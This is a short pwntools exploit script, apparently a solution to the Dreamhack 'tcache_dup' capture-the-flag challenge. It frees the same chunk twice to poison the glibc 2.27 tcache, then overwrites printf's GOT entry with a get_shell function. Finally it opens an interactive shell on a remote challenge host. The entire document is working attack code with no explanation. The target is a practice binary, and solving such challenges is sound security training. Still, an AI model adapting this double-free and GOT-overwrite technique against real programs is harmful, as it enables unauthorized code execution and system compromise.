#!/usr/bin/env python3

from pwn import *

exe = ELF("tcache_dup_patched", checksec = False)
libc = ELF("libc-2.27.so", checksec = False)
ld = ELF("ld-2.27.so", checksec = False)

context.binary = exe

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', size)
    p.sendlineafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', idx)

if args.LOCAL:
    p = process(exe.path)
else:
    p = remote("host8.dreamhack.games", 11664)

# input()
create(b'32', b'AAAAAAAA')
delete(b'0')
delete(b'0')
create(b'32', p64(exe.got["printf"]))
create(b'32', b'a'*8)
create(b'32', p64(exe.sym["get_shell"]))

p.interactive()


